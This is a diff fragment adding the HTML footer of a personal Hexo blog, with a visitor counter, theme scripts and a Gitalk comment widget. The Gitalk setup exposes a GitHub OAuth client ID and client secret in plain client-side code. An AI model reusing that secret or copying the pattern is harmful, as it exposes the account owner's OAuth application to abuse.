+        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
+    }
+setInterval("createtime()",250);
+</script>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-user"></i>
+    </span>
+    <span class="site-uv" title="总访客量">
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+    </span>
+  
+    <span class="post-meta-divider">|</span>
+  
+    <span class="post-meta-item-icon">
+      <i class="fa fa-eye"></i>
+    </span>
+    <span class="site-pv" title="总访问量">
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+  </div>
+
+  
+    
+    
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/jquery/index.js?v=3.4.1"></script>
+  <script src="/lib/fancybox/source/jquery.fancybox.pack.js"></script>
+  <script src="/lib/reading_progress/reading_progress.js"></script>
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  <script src="/js/utils.js?v=7.3.0"></script>
+  <script src="/js/motion.js?v=7.3.0"></script>
+
+  
+  <script src="/js/affix.js?v=7.3.0"></script>
+  <script src="/js/schemes/pisces.js?v=7.3.0"></script>
+
+
+
+  
+  <script src="/js/scrollspy.js?v=7.3.0"></script>
+<script src="/js/post-details.js?v=7.3.0"></script>
+
+
+
+  <script src="/js/next-boot.js?v=7.3.0"></script>
+
+  
+
+  
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <script src="/js/local-search.js?v=7.3.0"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+    
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+<script src="//cdn.jsdelivr.net/npm/js-md5@0.7.3/src/md5.min.js"></script>
+
+<script>
+  var gitalk = new Gitalk({
+    clientID: '925b9aa350afc793e04c',
+    clientSecret: 'bcd92ef416b81450a12e6388b00dfa49f798437a',
+    repo: 'Wh0ale.github.io',
+    owner: 'Wh0ale',
+    admin: ['Wh0ale'],
+    id: md5(location.pathname),
+      language: window.navigator.language || window.navigator.userLanguage,
+    
+    distractionFreeMode: 'true'
+  });
+  gitalk.render('gitalk-container');
+</script>
+
+
+</body>
+</html>
